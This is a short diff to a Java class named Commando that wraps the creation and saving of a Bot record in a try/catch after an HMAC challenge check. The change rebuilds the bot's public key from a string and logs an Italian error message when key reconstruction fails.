@@ -7,6 +7,7 @@ import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
+import java.security.spec.InvalidKeySpecException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
@@ -165,11 +166,16 @@ public class Commando {
 			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 				response = "Challenge OK";
 				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-				Bot bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
-						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-						objects.get(6).toString(), (PublicKey) objects.get(8),
-						Boolean.parseBoolean(objects.get(9).toString()));
-				bServ.save(bot);
+				Bot bot;
+				try {
+					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
+							objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
+							objects.get(6).toString(), pki.rebuildPuK(objects.get(8).toString()),
+							Boolean.parseBoolean(objects.get(9).toString()));
+					bServ.save(bot);
+				} catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
+					System.out.println("Non sono riuscito a salvare il bot causa ricostruzione chiave");
+				}
 			}
 		}
 		return response;
